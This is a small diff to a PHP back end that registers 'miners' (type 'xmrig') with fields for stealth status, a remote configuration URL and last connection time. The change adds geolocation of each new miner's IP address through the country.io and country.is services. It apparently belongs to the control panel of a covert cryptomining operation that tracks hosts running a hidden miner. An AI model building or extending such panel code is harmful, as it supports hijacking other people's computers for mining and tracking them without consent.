@@ -45,7 +45,8 @@ $fields = [
     'ms_version'=>getData('version'),
     'ms_stealthfound'=>getData('stealthfound'),
     'ms_remoteURL'=>getData('remoteconfig'),
-    'ms_lastConnection'=>$currentDate
+    'ms_lastConnection'=>$currentDate,
+    'ms_country'=>'Unknown'
 ];
 
 try {
@@ -65,6 +66,12 @@ try {
         $s->execute(array_merge(array_values($fields), [$configres['ms_minerID']]));
         $s->closeCursor();
     } else {
+        $countries = get_object_vars(json_decode(file_get_contents('http://country.io/names.json')));
+        $minerCountry = file_get_contents('https://api.country.is/'.$hostaddress);
+        if (!($minerCountry === FALSE)){
+            $fields['ms_country'] = $countries[get_object_vars(json_decode($minerCountry))['country']];
+        }
+
         $s = getConn()->prepare("INSERT INTO miners (ms_uqhash, ms_rid, ms_type, ms_config, ".implode(', ', array_keys($fields)).") VALUES (?, ?, ?, ?".str_repeat(", ?", count($fields)).")");
         $s->execute(array_merge([$uqhash, $id, $type, ($type == 'xmrig' ? 1 : 2)], array_values($fields)));
         $s->closeCursor();
